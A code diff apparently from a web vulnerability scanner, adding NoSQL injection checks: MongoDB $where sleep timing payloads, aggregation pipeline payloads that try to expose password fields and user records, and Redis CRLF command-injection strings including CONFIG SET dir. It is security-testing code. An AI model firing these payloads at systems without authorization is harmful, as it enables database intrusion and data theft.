@@ -45,7 +45,99 @@ class NoSQLModule:
         
         # Test JavaScript injection
         self._test_js_injection(url, method, param, value)
+        
+        # Test blind timing
+        self._test_blind_timing(url, method, param, value)
+        
+        # Test aggregation pipeline injection
+        self._test_aggregation_pipeline(url, method, param, value)
+        
+        # Test Redis injection
+        self._test_redis_injection(url, method, param, value)
     
+    def _test_blind_timing(self, url: str, method: str, param: str, value: str):
+        """Test blind NoSQL injection via timing"""
+        import time
+        payloads = ['{"$where": "sleep(5000)"}', "1;sleep(5000)"]
+        try:
+            start = time.time()
+            self.requester.request(url, method, data={param: value})
+            baseline = time.time() - start
+        except Exception:
+            baseline = 0
+        for payload in payloads:
+            try:
+                start = time.time()
+                self.requester.request(url, method, data={param: payload})
+                elapsed = time.time() - start
+                if elapsed > baseline + 4.0 and elapsed >= 4.5:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="NoSQL Injection (Blind / Timing-based)",
+                        url=url, severity='HIGH', confidence=0.7, param=param,
+                        payload=payload,
+                        evidence=f"Time delay: {elapsed:.1f}s vs baseline {baseline:.1f}s",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_aggregation_pipeline(self, url: str, method: str, param: str, value: str):
+        """Test aggregation pipeline injection"""
+        payloads = [
+            '[{"$match": {"password": {"$gt": ""}}}, {"$group": {"_id": "$password"}}]',
+            '{"$lookup": {"from": "users", "localField": "user_id", "foreignField": "_id", "as": "leaked"}}',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for ind in ['password', 'leaked', 'email', 'username']:
+                    if ind in text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="NoSQL Injection (Aggregation Pipeline)",
+                            url=url, severity='HIGH', confidence=0.75, param=param,
+                            payload=payload,
+                            evidence=f"Aggregation indicator: {ind}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+
+    def _test_redis_injection(self, url: str, method: str, param: str, value: str):
+        """Test Redis command injection"""
+        payloads = [
+            'test\\r\\nCONFIG SET dir /tmp\\r\\n',
+            'test\\r\\nINFO\\r\\n',
+            '\\r\\nPING\\r\\n',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for ind in ['redis_version', '+pong', '+ok', 'connected_clients']:
+                    if ind in text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="NoSQL Injection (Redis Command Injection)",
+                            url=url, severity='CRITICAL', confidence=0.9, param=param,
+                            payload=payload,
+                            evidence=f"Redis indicator: {ind}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+
     def test_url(self, url: str):
         """Test URL for NoSQL Injection"""
         pass
